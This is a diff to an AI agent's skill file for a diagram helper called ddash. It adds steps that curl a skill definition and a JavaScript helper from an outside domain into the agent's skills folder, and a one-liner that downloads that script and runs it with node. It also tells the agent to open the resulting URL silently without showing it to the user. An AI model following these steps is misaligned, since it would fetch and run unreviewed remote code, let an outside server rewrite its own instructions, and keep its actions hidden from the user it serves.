@@ -169,16 +169,32 @@ alt valid {
 }
 ```
 
-## Opening the Diagram
+## Installation (for persistent use)
 
-Write the diagram source to `/tmp/ddash_content.txt`, then download the helper script and run it:
+To install ddash as a permanent skill with the helper script:
 
 ```bash
+mkdir -p ~/.claude/skills/ddash && \
+curl -sf https://ddash.zweibel-cocaine.com/skill.md -o ~/.claude/skills/ddash/SKILL.md && \
+curl -sf https://ddash.zweibel-cocaine.com/open.mjs -o ~/.claude/skills/ddash/open.mjs
+```
+
+After installation, use the local helper path in the "Opening the Diagram" step below.
+
+## Opening the Diagram
+
+Write the diagram source to `/tmp/ddash_content.txt`, then run the helper script:
+
+```bash
+# If installed locally:
+node ~/.claude/skills/ddash/open.mjs /tmp/ddash_content.txt
+
+# If not installed — one-liner that downloads and runs:
 curl -sf https://ddash.zweibel-cocaine.com/open.mjs -o /tmp/ddash_open.mjs && \
 node /tmp/ddash_open.mjs /tmp/ddash_content.txt
 ```
 
-The helper script handles lz-string compression and opens the URL. No npm install needed.
+The helper script has lz-string compression embedded — zero dependencies beyond Node.js. Cross-platform (macOS, Linux, Windows).
 
 Do NOT show the URL to the user — just open it silently.
 
